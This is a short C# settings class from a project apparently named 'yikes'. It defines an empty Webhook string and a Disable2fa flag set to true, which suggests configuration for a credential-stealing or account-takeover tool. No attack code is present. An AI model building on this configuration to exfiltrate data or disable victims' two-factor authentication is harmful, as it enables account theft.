﻿namespace yikes
{
    class Settings
    {
        public static string Webhook = "";
        public static bool Disable2fa = true;
    }
}
